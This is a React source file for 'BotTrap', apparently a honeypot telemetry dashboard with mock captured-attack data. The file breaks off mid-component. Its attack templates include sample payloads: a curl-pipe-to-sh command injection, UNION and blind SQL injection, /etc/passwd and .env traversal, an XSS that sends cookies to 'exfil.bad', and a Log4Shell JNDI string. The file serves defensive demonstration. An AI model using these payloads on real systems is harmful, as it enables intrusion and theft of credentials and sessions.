import React, { useState, useEffect, useMemo, useRef, useCallback } from 'react';
import {
  Shield,
  Activity,
  Play,
  Pause,
  Zap,
  Download,
  Info,
  Search,
  X,
  ChevronRight,
  Terminal,
  Copy,
  Check,
  Crosshair,
  AlertTriangle,
  Globe,
  Server,
  RotateCcw,
  Cpu,
  Layers,
  Lock,
  FileText,
  ArrowUpRight,
  Radio,
} from 'lucide-react';
import { SEVERITY_META, COLORS, PIE_COLORS } from './theme.js';
import logoImg from './styles/illuminati_ai_logo.svg.png';

// ============================================================================
// DESIGN TOKENS & CONSTANTS ("Dark Chromatic" Precision Engineering System)
// ============================================================================

const USE_MOCK = import.meta.env?.VITE_USE_MOCK === 'true';
const API_BASE = import.meta.env?.VITE_API_URL || '';

const ATTACK_TYPES = [
  'Honey-Token Used',
  'SQL Injection',
  'SSH Brute Force',
  'Command Injection / RCE',
  'Path Traversal',
  'Credential Stuffing',
  'XSS',
];

const DECOY_ENDPOINTS = [
  { path: '/admin', proto: 'HTTPS:443', status: 'ARMED' },
  { path: '/wp-login.php', proto: 'HTTPS:443', status: 'ARMED' },
  { path: '/.env', proto: 'HTTPS:443', status: 'ARMED' },
  { path: '/api/v1/login', proto: 'HTTPS:443', status: 'ARMED' },
  { path: 'SSH:22', proto: 'TCP:22', status: 'TARPIT' },
];

const HONEYPOT_NODE = {
  id: 'IN-NODE-01',
  name: 'BotTrap Sensor (Mumbai, IN)',
  lat: 19.076,
  lon: 72.8777,
};

// ============================================================================
// MOCK HONEY-TOKENS DATA (used when VITE_USE_MOCK=true)
// ============================================================================

const THREAT_ACTORS = [
  { ip: '185.220.101.42', country: 'Germany', code: 'DE', city: 'Frankfurt', lat: 50.11, lon: 8.68, asn: 'AS205100 F3Netze e.V.' },
  { ip: '45.155.205.93', country: 'Russia', code: 'RU', city: 'Moscow', lat: 55.75, lon: 37.61, asn: 'AS49505 OOO Network of DC' },
  { ip: '103.149.28.114', country: 'China', code: 'CN', city: 'Shenzhen', lat: 22.54, lon: 114.05, asn: 'AS4134 Chinanet' },
  { ip: '198.98.56.149', country: 'United States', code: 'US', city: 'Ashburn', lat: 39.04, lon: -77.48, asn: 'AS53667 FranTech Solutions' },
  { ip: '177.54.148.201', country: 'Brazil', code: 'BR', city: 'Sao Paulo', lat: -23.55, lon: -46.63, asn: 'AS262589 Internexa Brasil' },
  { ip: '91.240.118.168', country: 'Netherlands', code: 'NL', city: 'Amsterdam', lat: 52.37, lon: 4.89, asn: 'AS202425 IP Volume Inc' },
  { ip: '118.25.6.39', country: 'China', code: 'CN', city: 'Shanghai', lat: 31.23, lon: 121.47, asn: 'AS45090 Tencent Cloud' },
  { ip: '141.98.10.224', country: 'Lithuania', code: 'LT', city: 'Vilnius', lat: 54.68, lon: 25.27, asn: 'AS44477 Stark Industries' },
  { ip: '104.244.76.13', country: 'Luxembourg', code: 'LU', city: 'Roost', lat: 49.77, lon: 6.10, asn: 'AS53667 PONYNET' },
  { ip: '175.45.176.88', country: 'South Korea', code: 'KR', city: 'Seoul', lat: 37.56, lon: 126.97, asn: 'AS4766 Korea Telecom' },
  { ip: '193.142.146.35', country: 'Romania', code: 'RO', city: 'Bucharest', lat: 44.42, lon: 26.10, asn: 'AS9009 M247 Europe' },
  { ip: '154.213.185.62', country: 'Singapore', code: 'SG', city: 'Singapore', lat: 1.35, lon: 103.81, asn: 'AS136907 Huawei Cloud' },
  { ip: '196.251.86.11', country: 'South Africa', code: 'ZA', city: 'Johannesburg', lat: -26.20, lon: 28.04, asn: 'AS37100 SEACOM' },
  { ip: '209.141.54.18', country: 'United States', code: 'US', city: 'Las Vegas', lat: 36.17, lon: -115.13, asn: 'AS53667 FranTech' },
];

const ATTACK_TEMPLATES = [
  {
    attackType: 'Command Injection / RCE',
    severity: 'CRITICAL',
    mitreId: 'T1059',
    mitreName: 'Command & Scripting Interpreter',
    mitreTactic: 'Execution',
    ruleId: 'SH-RCE-001',
    method: 'POST',
    port: 443,
    targetPath: '/api/v1/login',
    payload: 'username=admin;curl -s http://185.220.101.42/dropper.sh | sh&password=x',
    rawRequest: (ip, path, payload) =>
      `POST ${path} HTTP/1.1\nHost: decoy-01.bottrap.internal\nX-Forwarded-For: ${ip}\nUser-Agent: Mozilla/5.0 (compatible; zgrab/0.x)\nContent-Type: application/x-www-form-urlencoded\nContent-Length: ${payload.length}\n\n${payload}`,
    aiSummary: 'Remote shell dropper invocation attempting to fetch and execute an unverified second-stage ELF binary directly via POSIX sh pipe.',
    aiIntent: 'Initial foothold establishment and Mirai/botnet implant deployment.',
    confidence: 98,
    mitigationType: 'iptables',
  },
  {
    attackType: 'SQL Injection',
    severity: 'CRITICAL',
    mitreId: 'T1190',
    mitreName: 'Exploit Public-Facing Application',
    mitreTactic: 'Initial Access',
    ruleId: 'SH-SQLI-004',
    method: 'POST',
    port: 443,
    targetPath: '/admin',
    payload: "user=admin' UNION SELECT 1,username,password_hash,email FROM users-- -&pass=123",
    rawRequest: (ip, path, payload) =>
      `POST ${path} HTTP/1.1\nHost: decoy-01.bottrap.internal\nX-Real-IP: ${ip}\nUser-Agent: sqlmap/1.8.4#stable (https://sqlmap.org)\nContent-Type: application/x-www-form-urlencoded\n\n${payload}`,
    aiSummary: 'Automated UNION-based SQL injection signature matching sqlmap fingerprint, targeting credential table exfiltration on /admin.',
    aiIntent: 'Database schema enumeration and administrative credential dumping.',
    confidence: 97,
    mitigationType: 'nginx',
  },
  {
    attackType: 'Path Traversal',
    severity: 'HIGH',
    mitreId: 'T1083',
    mitreName: 'File and Directory Discovery',
    mitreTactic: 'Discovery',
    ruleId: 'SH-LFI-002',
    method: 'GET',
    port: 443,
    targetPath: '/.env',
    payload: 'GET /../../../../etc/passwd?file=..%2f..%2f.env HTTP/1.1',
    rawRequest: (ip, path, payload) =>
      `GET ${path}?debug=../../../../etc/passwd HTTP/1.1\nHost: decoy-01.bottrap.internal\nX-Forwarded-For: ${ip}\nUser-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)\nAccept: */*\nConnection: close`,
    aiSummary: 'Directory traversal and environment secret harvesting probe using encoded relative path sequences to read local system files.',
    aiIntent: 'Extract AWS/DB credentials from .env or local user accounts from /etc/passwd.',
    confidence: 94,
    mitigationType: 'nginx',
  },
  {
    attackType: 'SSH Brute Force',
    severity: 'HIGH',
    mitreId: 'T1110',
    mitreName: 'Brute Force',
    mitreTactic: 'Credential Access',
    ruleId: 'SH-SSH-009',
    method: 'SSH-AUTH',
    port: 22,
    targetPath: 'SSH:22',
    payload: 'user=root auth=password pass="admin2026!" (attempt #47/min)',
    rawRequest: (ip, path, payload) =>
      `[SSH-2.0-OpenSSH_8.9p1 BotTrap-Tarpit]\nSRC=${ip}:51842 DST=10.0.4.12:22\nCLIENT_BANNER: SSH-2.0-libssh2_1.10.0\nAUTH_METHOD: password\nPAYLOAD: ${payload}\nTARPIT_DELAY: 4200ms`,
    aiSummary: 'High-velocity dictionary attack against SSH daemon port 22 using automated libssh2 spray worker targeting privileged root account.',
    aiIntent: 'Gain interactive shell access for cryptomining or lateral proxy pivoting.',
    confidence: 96,
    mitigationType: 'iptables',
  },
  {
    attackType: 'Credential Stuffing',
    severity: 'MEDIUM',
    mitreId: 'T1078',
    mitreName: 'Valid Accounts',
    mitreTactic: 'Defense Evasion',
    ruleId: 'SH-CRED-011',
    method: 'POST',
    port: 443,
    targetPath: '/wp-login.php',
    payload: 'log=wp_admin&pwd=Summer2025!@#&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F',
    rawRequest: (ip, path, payload) =>
      `POST ${path} HTTP/1.1\nHost: decoy-01.bottrap.internal\nX-Forwarded-For: ${ip}\nUser-Agent: python-requests/2.31.0\nContent-Type: application/x-www-form-urlencoded\n\n${payload}`,
    aiSummary: 'Automated credential replay against WordPress authentication decoy using leaked corporate password list patterns.',
    aiIntent: 'Compromise CMS admin panel to upload webshell or inject SEO spam.',
    confidence: 89,
    mitigationType: 'nginx',
  },
  {
    attackType: 'SQL Injection',
    severity: 'HIGH',
    mitreId: 'T1190',
    mitreName: 'Exploit Public-Facing Application',
    mitreTactic: 'Initial Access',
    ruleId: 'SH-SQLI-002',
    method: 'GET',
    port: 443,
    targetPath: '/api/v1/login',
    payload: "id=1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -",
    rawRequest: (ip, path, payload) =>
      `GET ${path}?${encodeURIComponent(payload)} HTTP/1.1\nHost: decoy-01.bottrap.internal\nX-Real-IP: ${ip}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\nAccept: application/json`,
    aiSummary: 'Time-based blind SQL injection probe using MySQL SLEEP(5) oracle to confirm injectable query parameter without visible error output.',
    aiIntent: 'Confirm blind SQLi vulnerability for automated boolean data extraction.',
    confidence: 93,
    mitigationType: 'nginx',
  },
  {
    attackType: 'XSS',
    severity: 'MEDIUM',
    mitreId: 'T1189',
    mitreName: 'Drive-by Compromise',
    mitreTactic: 'Initial Access',
    ruleId: 'SH-XSS-003',
    method: 'GET',
    port: 443,
    targetPath: '/admin',
    payload: 'q=<svg/onload=fetch("https://exfil.bad/c?d="+btoa(document.cookie))>',
    rawRequest: (ip, path, payload) =>
      `GET ${path}?${payload} HTTP/1.1\nHost: decoy-01.bottrap.internal\nX-Forwarded-For: ${ip}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0\nAccept: text/html`,
    aiSummary: 'Reflected/Stored XSS vector utilizing SVG onload event handler designed to exfiltrate admin session cookies to external collector.',
    aiIntent: 'Session hijacking of SOC/admin operators reviewing dashboard logs.',
    confidence: 87,
    mitigationType: 'nginx',
  },
  {
    attackType: 'Path Traversal',
    severity: 'LOW',
    mitreId: 'T1083',
    mitreName: 'File and Directory Discovery',
    mitreTactic: 'Discovery',
    ruleId: 'SH-SCAN-007',
    method: 'GET',
    port: 443,
    targetPath: '/.env',
    payload: 'GET /.env.production HTTP/1.1 (automated cloud secret scanner)',
    rawRequest: (ip, path) =>
      `GET ${path}.production HTTP/1.1\nHost: decoy-01.bottrap.internal\nX-Forwarded-For: ${ip}\nUser-Agent: Go-http-client/1.1\nAccept-Encoding: gzip`,
    aiSummary: 'Opportunistic internet-wide scanner checking for exposed dotenv configuration files and cloud API keys.',
    aiIntent: 'Reconnaissance for misconfigured webroot secrets (AWS/Stripe/SMTP).',
    confidence: 84,
    mitigationType: 'nginx',
  },
  {
    attackType: 'Command Injection / RCE',
    severity: 'CRITICAL',
    mitreId: 'T1059',
    mitreName: 'Command & Scripting Interpreter',
    mitreTactic: 'Execution',
    ruleId: 'SH-RCE-006',
    method: 'POST',
    port: 443,
    targetPath: '/wp-login.php',
    payload: '${jndi:ldap://193.142.146.35:1389/Basic/Command/Base64/d2dldCBodHRwOi8v...}',
    rawRequest: (ip, path, payload) =>
      `POST ${path} HTTP/1.1\nHost: decoy-01.bottrap.internal\nX-Forwarded-For: ${ip}\nUser-Agent: ${payload}\nX-Api-Version: ${payload}\nContent-Length: 0`,
    aiSummary: 'Log4Shell (CVE-2021-44228) JNDI LDAP lookup injection embedded in HTTP User-Agent and X-Api-Version headers.',
    aiIntent: 'Trigger remote class loading and arbitrary Java deserialization RCE.',
    confidence: 99,
    mitigationType: 'iptables',
  },
  {
    attackType: 'SSH Brute Force',
    severity: 'LOW',
    mitreId: 'T1110',
    mitreName: 'Brute Force',
    mitreTactic: 'Credential Access',
    ruleId: 'SH-SSH-003',
    method: 'SSH-AUTH',
    port: 22,
    targetPath: 'SSH:22',
    payload: 'user=ubuntu auth=publickey key_fp=SHA256:9xK2...m8P (probe)',
    rawRequest: (ip, path, payload) =>
      `[SSH-2.0-OpenSSH_8.9p1 BotTrap-Tarpit]\nSRC=${ip}:44120 DST=10.0.4.12:22\nCLIENT_BANNER: SSH-2.0-Go\nPAYLOAD: ${payload}`,
    aiSummary: 'Low-rate SSH key enumeration probe checking default cloud image username (ubuntu) availability.',
    aiIntent: 'Identify active SSH targets prior to credential stuffing campaign.',
    confidence: 78,
    mitigationType: 'iptables',
  },
];

const MOCK_TOKEN_STATS = {
  issued: 12,
  used: 2,
  readers: 9,
  avg_seconds_to_use: 87,
  last_used_at: new Date(MOCK_NOW - 2 * 60 * 1000).toISOString(),
};

// ============================================================================
// POLLING HOOK (supports real API and VITE_USE_MOCK=true)
// ============================================================================

function formatTimeHMS(iso) {
  const d = new Date(iso);
  return d.toTimeString().slice(0, 8);
}

function formatFullTimestamp(iso) {
  const d = new Date(iso);
  return `${d.toISOString().slice(0, 10)} ${d.toTimeString().slice(0, 8)} UTC`;
}

// Equirectangular projection helper for SVG viewBox 800 x 380
function projectLonLat(lon, lat, width = 800, height = 380) {
  const x = ((lon + 180) / 360) * width;
  const y = ((90 - lat) / 180) * height;
  return [x, y];
}

// ============================================================================
// ERROR BOUNDARY (Mirrors BotTrap/frontend/src/lib/ErrorBoundary.jsx)
// ============================================================================

class ErrorBoundary extends React.Component {
  constructor(props) {
    super(props);
    this.state = { hasError: false, message: '' };
  }
  static getDerivedStateFromError(error) {
    return { hasError: true, message: error?.message || 'Unexpected telemetry render error' };
  }
  render() {
    if (this.state.hasError) {
      return (
        <div className="min-h-screen bg-[#08090B] text-[#F0F2F5] flex items-center justify-center p-6 font-mono">
          <div className="border border-[#E5484D]/40 bg-[#0E1014] p-6 rounded-[4px] max-w-md w-full">
            <div className="text-[#E5484D] text-xs uppercase tracking-widest mb-2">
              TELEMETRY RENDER FAULT
            </div>
            <p className="text-sm text-[#8A93A2] mb-4">{this.state.message}</p>
            <button
              onClick={() => this.setState({ hasError: false, message: '' })}
              className="px-3 py-1.5 text-xs bg-[#14171D] border border-[#2E3543] rounded-[4px] hover:bg-[#1E232C] text-[#F0F2F5]"
            >
              Reinitialize View
            </button>
          </div>
        </div>
      );
    }
    return this.props.children;
  }
}

// ============================================================================
// SIMPLIFIED PRECISION VECTOR WORLD MAP POLYGONS (Equirectangular 800x380)
// ============================================================================

const WORLD_CONTINENTS = [
  // North America
  'M 85,55 L 145,42 L 210,48 L 245,78 L 235,112 L 205,135 L 185,155 L 168,175 L 155,165 L 138,145 L 112,120 L 95,90 Z',
  // Greenland
  'M 250,24 L 298,20 L 315,44 L 285,66 L 260,55 Z',
  // South America
  'M 218,190 L 252,195 L 288,225 L 296,258 L 272,298 L 254,335 L 236,342 L 228,305 L 218,255 L 208,218 Z',
  // Europe
  'M 378,52 L 420,44 L 465,50 L 478,78 L 456,105 L 432,112 L 405,116 L 385,108 L 372,92 L 384,74 Z',
  // UK & Ireland
  'M 366,74 L 376,72 L 378,86 L 367,88 Z',
  // Africa
  'M 374,126 L 428,124 L 468,142 L 494,178 L 486,216 L 466,258 L 444,292 L 426,288 L 414,244 L 398,208 L 370,184 L 364,152 Z',
  // Middle East & Asia
  'M 468,78 L 535,52 L 625,46 L 705,58 L 732,84 L 702,118 L 675,148 L 642,168 L 615,186 L 592,165 L 570,185 L 552,160 L 525,158 L 496,144 L 474,120 Z',
  // Japan / East Asia Islands
  'M 692,102 L 708,96 L 714,114 L 698,124 Z',
  // Southeast Asia / Indonesia
  'M 612,196 L 648,198 L 674,212 L 656,222 L 620,214 Z',
  // Australia
  'M 656,246 L 712,242 L 738,266 L 730,302 L 698,312 L 664,296 L 650,272 Z',
];

// ============================================================================
// COMPONENT 1: NAVBAR
// ============================================================================

function Navbar({
  isLive,
  onToggleLive,
  onSimulateAttack,
  onExportReport,
  onOpenAbout,
  simulating,
  eventCount,
}) {
  const [exportMenuOpen, setExportMenuOpen] = useState(false);
  const menuRef = useRef(null);

  useEffect(() => {
    const handleOutside = (e) => {
      if (menuRef.current && !menuRef.current.contains(e.target)) {
        setExportMenuOpen(false);
      }
    };
    document.addEventListener('mousedown', handleOutside);
    return () => document.removeEventListener('mousedown', handleOutside);
  }, []);

  return (
    <header className="sticky top-0 z-30 bg-[#08090B]/95 backdrop-blur-sm border-b border-[#1E232C]">
      {/* Razor-thin 1px prismatic chromatic hairline */}
      <div
        className="h-[1px] w-full"
        style={{
          background:
            'linear-gradient(90deg, #3B82F6 0%, #14B8A6 33%, #E5A93C 66%, #E5484D 100%)',
        }}
      />
      <div className="max-w-[1600px] mx-auto px-4 sm:px-6 h-14 flex items-center justify-between gap-3">
        {/* Brand Mark */}
        <div className="flex items-center gap-3 min-w-0">
          <div className="w-8 h-8 rounded-[4px] bg-[#14171D] border border-[#2E3543] flex items-center justify-center shrink-0 overflow-hidden p-0.5">
            <img src={logoImg} alt="BotTrap Logo" className="w-full h-full object-contain" />
          </div>
          <div className="flex items-center gap-2.5 min-w-0">
            <span className="font-semibold tracking-[0.14em] text-sm text-[#F0F2F5]">
              BOTTRAP
            </span>
            <span className="hidden sm:inline-flex items-center px-2 py-0.5 text-[10px] font-mono tracking-wider text-[#8A93A2] bg-[#0E1014] border border-[#1E232C] rounded-[4px]">
              HONEYPOT TELEMETRY v2.4
            </span>
          </div>
        </div>

        {/* Right Telemetry Controls */}
        <div className="flex items-center gap-2">
          {/* Live Polling Toggle */}
          <button
            onClick={onToggleLive}
            title={isLive ? 'Pause live telemetry stream' : 'Resume live telemetry stream'}
            className={`h-8 px-2.5 sm:px-3 rounded-[4px] border text-xs font-mono flex items-center gap-2 transition-colors ${
              isLive
                ? 'bg-[#0E1014] border-[#2EB872]/40 text-[#F0F2F5] hover:border-[#2EB872]/70'
                : 'bg-[#0E1014] border-[#1E232C] text-[#8A93A2] hover:border-[#2E3543] hover:text-[#F0F2F5]'
            }`}
          >
            <span
              className={`w-1.5 h-1.5 rounded-full ${
                isLive ? 'bg-[#2EB872] animate-pulse' : 'bg-[#525B6A]'
              }`}
            />
            {isLive ? (
              <Pause className="w-3 h-3 text-[#2EB872]" />
            ) : (
              <Play className="w-3 h-3 text-[#8A93A2]" />
            )}
            <span className="hidden md:inline">{isLive ? 'LIVE 3.5s' : 'PAUSED'}</span>
          </button>

          {/* Simulate Attack Button */}
          <button
            onClick={onSimulateAttack}
            className="h-8 px-2.5 sm:px-3 rounded-[4px] bg-[#14171D] border border-[#2E3543] hover:border-[#E5484D]/60 text-xs font-medium text-[#F0F2F5] flex items-center gap-1.5 transition-all active:scale-[0.98]"
          >
            <Zap
              className={`w-3.5 h-3.5 ${
                simulating ? 'text-[#E5484D]' : 'text-[#E5A93C]'
              }`}
            />
            <span>Simulate Attack</span>
          </button>

          {/* Export Report Button (Dropdown: Markdown / JSON) */}
          <div className="relative" ref={menuRef}>
            <button
              onClick={() => setExportMenuOpen((v) => !v)}
              className="h-8 px-2.5 sm:px-3 rounded-[4px] bg-[#0E1014] border border-[#1E232C] hover:border-[#2E3543] text-xs font-medium text-[#F0F2F5] flex items-center gap-1.5 transition-colors"
            >
              <Download className="w-3.5 h-3.5 text-[#8A93A2]" />
              <span className="hidden sm:inline">Export Report</span>
            </button>
            {exportMenuOpen && (
              <div className="absolute right-0 mt-1.5 w-52 bg-[#0E1014] border border-[#2E3543] rounded-[4px] shadow-2xl py-1 z-40">
                <div className="px-3 py-1.5 text-[10px] font-mono uppercase tracking-wider text-[#525B6A] border-b border-[#1E232C]">
                  Export {eventCount} Filtered Events
                </div>
                <button
                  onClick={() => {
                    onExportReport('md');
                    setExportMenuOpen(false);
                  }}
                  className="w-full px-3 py-2 text-left text-xs text-[#F0F2F5] hover:bg-[#14171D] flex items-center justify-between"
                >
                  <span className="flex items-center gap-2">
                    <FileText className="w-3.5 h-3.5 text-[#14B8A6]" />
                    Incident Report (.md)
                  </span>
                  <span className="font-mono text-[10px] text-[#525B6A]">MD</span>
                </button>
                <button
                  onClick={() => {
                    onExportReport('json');
                    setExportMenuOpen(false);
                  }}
                  className="w-full px-3 py-2 text-left text-xs text-[#F0F2F5] hover:bg-[#14171D] flex items-center justify-between"
                >
                  <span className="flex items-center gap-2">
                    <Terminal className="w-3.5 h-3.5 text-[#3B82F6]" />
                    SIEM Telemetry (.json)
                  </span>
                  <span className="font-mono text-[10px] text-[#525B6A]">JSON</span>
                </button>
              </div>
            )}
          </div>

          {/* Architecture / About Button */}
          <button
            onClick={onOpenAbout}
            title="BotTrap Architecture & Pipeline"
            className="h-8 w-8 sm:w-auto sm:px-2.5 rounded-[4px] bg-[#0E1014] border border-[#1E232C] hover:border-[#2E3543] text-xs text-[#8A93A2] hover:text-[#F0F2F5] flex items-center justify-center gap-1.5 transition-colors"
          >
            <Info className="w-3.5 h-3.5" />
            <span className="hidden lg:inline">Architecture</span>
          </button>
        </div>
      </div>
    </header>
  );
}

// ============================================================================
// COMPONENT 2: THREAT LEVEL BANNER
// ============================================================================

function ThreatLevelBanner({ events, onSelectPath }) {
  const metrics = useMemo(() => {
    const recentWindow = events.slice(0, 20);
    const critCount = recentWindow.filter((e) => e.severity === 'CRITICAL').length;
    const highCount = recentWindow.filter((e) => e.severity === 'HIGH').length;
    const ratio = recentWindow.length ? (critCount * 2 + highCount) / (recentWindow.length * 2) : 0;

    let level = 'LOW';
    let color = '#2EB872';
    if (ratio >= 0.48 || critCount >= 7) {
      level = 'CRITICAL';
      color = '#E5484D';
    } else if (ratio >= 0.34 || critCount >= 4) {
      level = 'HIGH';
      color = '#F76B15';
    } else if (ratio >= 0.2) {
      level = 'ELEVATED';
      color = '#E5A93C';
    }

    // Estimate events per minute over last 15 minutes
    const now = Date.now();
    const last15Min = events.filter((e) => now - e.epoch <= 15 * 60 * 1000).length;
    const ratePerMin = Math.max(0.4, last15Min / 15).toFixed(1);

    return { level, color, ratePerMin, critRatio: Math.round(ratio * 100) };
  }, [events]);

  return (
    <div className="bg-[#0E1014] border border-[#1E232C] rounded-[4px] px-4 py-2.5 flex flex-wrap items-center justify-between gap-3">
      <div className="flex items-center gap-3 flex-wrap">
        <div className="flex items-center gap-2">
          <span
            className="w-2 h-2 rounded-full"
            style={{ backgroundColor: metrics.color }}
          />
          <span className="text-[11px] font-mono uppercase tracking-wider text-[#8A93A2]">
            THREAT POSTURE:
          </span>
          <span
            className="text-xs font-mono font-semibold px-2 py-0.5 rounded-[3px] border"
            style={{
              color: metrics.color,
              borderColor: `${metrics.color}44`,
              backgroundColor: `${metrics.color}14`,
            }}
          >
            {metrics.level}
          </span>
        </div>

        <span className="hidden sm:inline text-[#1E232C]">|</span>

        <div className="flex items-center gap-1.5 text-xs font-mono text-[#8A93A2] tabular-nums">
          <Activity className="w-3.5 h-3.5 text-[#14B8A6]" />
          <span className="text-[#F0F2F5] font-medium">{metrics.ratePerMin}</span>
          <span>ev/min</span>
          <span className="text-[#525B6A] ml-1">({metrics.critRatio}% sev-index)</span>
        </div>
      </div>

      {/* Active Decoy Endpoints */}
      <div className="flex items-center gap-1.5 flex-wrap">
        <span className="text-[10px] font-mono uppercase tracking-wider text-[#525B6A] mr-1">
          DECOYS:
        </span>
        {DECOY_ENDPOINTS.map((ep) => (
          <button
            key={ep.path}
            onClick={() => onSelectPath(ep.path)}
            title={`Filter events targeting ${ep.path} (${ep.proto})`}
            className="px-2 py-0.5 text-[11px] font-mono bg-[#14171D] hover:bg-[#1E232C] border border-[#1E232C] hover:border-[#2E3543] rounded-[3px] text-[#8A93A2] hover:text-[#F0F2F5] transition-colors flex items-center gap-1.5"
          >
            <span className="w-1 h-1 rounded-full bg-[#2EB872]" />
            {ep.path}
          </button>
        ))}
      </div>
    </div>
  );
}

// ============================================================================
// COMPONENT 3: STAT CARDS (4 Compact KPI Cards)
// ============================================================================

function StatCards({ events, allEvents, activeSeverity, onToggleCritical }) {
  const stats = useMemo(() => {
    const uniqueIps = new Set(events.map((e) => e.ip)).size;
    const criticalHits = events.filter((e) => e.severity === 'CRITICAL').length;
    const mitreCount = new Set(events.map((e) => e.mitreId)).size;
    const totalAll = allEvents.length;
    const critPct = events.length ? Math.round((criticalHits / events.length) * 100) : 0;

    return {
      total: events.length,
      totalAll,
      uniqueIps,
      criticalHits,
      critPct,
      mitreCount,
    };
  }, [events, allEvents]);

  const isCritActive = activeSeverity === 'CRITICAL';

  return (
    <div className="grid grid-cols-2 lg:grid-cols-4 gap-3">
      {/* KPI 1: Total Captured Events */}
      <div className="bg-[#0E1014] border border-[#1E232C] rounded-[4px] p-3.5 flex flex-col justify-between">
        <div className="flex items-center justify-between">
          <span className="text-[11px] font-mono uppercase tracking-wider text-[#8A93A2]">
            Captured Events
          </span>
          <Radio className="w-3.5 h-3.5 text-[#3B82F6]" />
        </div>
        <div className="mt-2 flex items-baseline justify-between">
          <span className="text-2xl font-mono font-semibold text-[#F0F2F5] tabular-nums">
            {stats.total.toLocaleString()}
          </span>
          <span className="text-[11px] font-mono text-[#2EB872] tabular-nums">
            {stats.total === stats.totalAll ? '+100% view' : `of ${stats.totalAll}`}
          </span>
        </div>
      </div>

      {/* KPI 2: Unique Threat Actors */}
      <div className="bg-[#0E1014] border border-[#1E232C] rounded-[4px] p-3.5 flex flex-col justify-between">
        <div className="flex items-center justify-between">
          <span className="text-[11px] font-mono uppercase tracking-wider text-[#8A93A2]">
            Unique Actors (IPs)
          </span>
          <Globe className="w-3.5 h-3.5 text-[#14B8A6]" />
        </div>
        <div className="mt-2 flex items-baseline justify-between">
          <span className="text-2xl font-mono font-semibold text-[#F0F2F5] tabular-nums">
            {stats.uniqueIps}
          </span>
          <span className="text-[11px] font-mono text-[#8A93A2] tabular-nums">
            distinct ASNs
          </span>
        </div>
      </div>

      {/* KPI 3: Critical Severity Hits (Interactive Filter Toggle) */}
      <button
        onClick={onToggleCritical}
        className={`text-left bg-[#0E1014] rounded-[4px] p-3.5 flex flex-col justify-between border transition-colors ${
          isCritActive
            ? 'border-[#E5484D] bg-[#E5484D]/[0.06]'
            : 'border-[#1E232C] hover:border-[#E5484D]/50'
        }`}
      >
        <div className="flex items-center justify-between w-full">
          <span className="text-[11px] font-mono uppercase tracking-wider text-[#8A93A2] flex items-center gap-1.5">
            Critical Severity
            {isCritActive && (
              <span className="text-[9px] px-1 py-0.2 bg-[#E5484D]/20 text-[#E5484D] rounded-[2px]">
                FILTERED
              </span>
            )}
          </span>
          <AlertTriangle className="w-3.5 h-3.5 text-[#E5484D]" />
        </div>
        <div className="mt-2 flex items-baseline justify-between w-full">
          <span className="text-2xl font-mono font-semibold text-[#E5484D] tabular-nums">
            {stats.criticalHits}
          </span>
          <span className="text-[11px] font-mono text-[#8A93A2] tabular-nums">
            {stats.critPct}% of feed
          </span>
        </div>
      </button>

      {/* KPI 4: MITRE Techniques Triggered */}
      <div className="bg-[#0E1014] border border-[#1E232C] rounded-[4px] p-3.5 flex flex-col justify-between">
        <div className="flex items-center justify-between">
          <span className="text-[11px] font-mono uppercase tracking-wider text-[#8A93A2]">
            MITRE Techniques
          </span>
          <Crosshair className="w-3.5 h-3.5 text-[#E5A93C]" />
        </div>
        <div className="mt-2 flex items-baseline justify-between">
          <span className="text-2xl font-mono font-semibold text-[#F0F2F5] tabular-nums">
            {stats.mitreCount}
          </span>
          <span className="text-[11px] font-mono text-[#8A93A2] tabular-nums">
            ATT&CK v15
          </span>
        </div>
      </div>
    </div>
  );
}

// ============================================================================
// COMPONENT 4: FILTER BAR
// ============================================================================

function FilterBar({
  searchQuery,
  onSearchChange,
  severityFilter,
  onSeverityChange,
  attackTypeFilter,
  onAttackTypeChange,
  mitreFilter,
  onClearMitre,
  actorFilter,
  onClearActor,
  onResetAll,
}) {
  const hasActiveFilters =
    searchQuery.trim() !== '' ||
    severityFilter !== 'ALL' ||
    attackTypeFilter !== 'ALL' ||
    mitreFilter !== null ||
    actorFilter !== null;

  const severities = ['ALL', 'CRITICAL', 'HIGH', 'MEDIUM', 'LOW'];

  return (
    <div className="bg-[#0E1014] border border-[#1E232C] rounded-[4px] p-3 flex flex-col gap-2.5">
      <div className="flex flex-wrap items-center gap-2.5">
        {/* Search Input */}
        <div className="relative flex-1 min-w-[220px]">
          <Search className="w-3.5 h-3.5 text-[#525B6A] absolute left-3 top-1/2 -translate-y-1/2 pointer-events-none" />
          <input
            type="text"
            value={searchQuery}
            onChange={(e) => onSearchChange(e.target.value)}
            placeholder="Filter IP, payload, endpoint, country, MITRE ID..."
            className="w-full h-8 pl-8 pr-7 bg-[#08090B] border border-[#1E232C] focus:border-[#3B82F6]/60 rounded-[4px] text-xs font-mono text-[#F0F2F5] placeholder-[#525B6A] outline-none transition-colors"
          />
          {searchQuery && (
            <button
              onClick={() => onSearchChange('')}
              className="absolute right-2 top-1/2 -translate-y-1/2 text-[#525B6A] hover:text-[#F0F2F5]"
            >
              <X className="w-3.5 h-3.5" />
            </button>
          )}
        </div>

        {/* Severity Toggle Pills */}
        <div className="flex items-center bg-[#08090B] border border-[#1E232C] rounded-[4px] p-0.5">
          {severities.map((sev) => {
            const active = severityFilter === sev;
            const meta = SEVERITY_META[sev];
            return (
              <button
                key={sev}
                onClick={() => onSeverityChange(sev)}
                className={`px-2.5 py-1 text-[11px] font-mono rounded-[3px] transition-colors ${
                  active
                    ? 'bg-[#14171D] text-[#F0F2F5] border border-[#2E3543]'
                    : 'text-[#8A93A2] hover:text-[#F0F2F5] border border-transparent'
                }`}
                style={active && meta ? { color: meta.color, borderColor: meta.border } : undefined}
              >
                {sev}
              </button>
            );
          })}
        </div>

        {/* Attack Type Select */}
        <select
          value={attackTypeFilter}
          onChange={(e) => onAttackTypeChange(e.target.value)}
          className="h-8 px-2.5 bg-[#08090B] border border-[#1E232C] focus:border-[#2E3543] rounded-[4px] text-xs font-mono text-[#F0F2F5] outline-none"
        >
          <option value="ALL">All Attack Vectors</option>
          {ATTACK_TYPES.map((t) => (
            <option key={t} value={t}>
              {t}
            </option>
          ))}
        </select>

        {/* Reset Button */}
        {hasActiveFilters && (
          <button
            onClick={onResetAll}
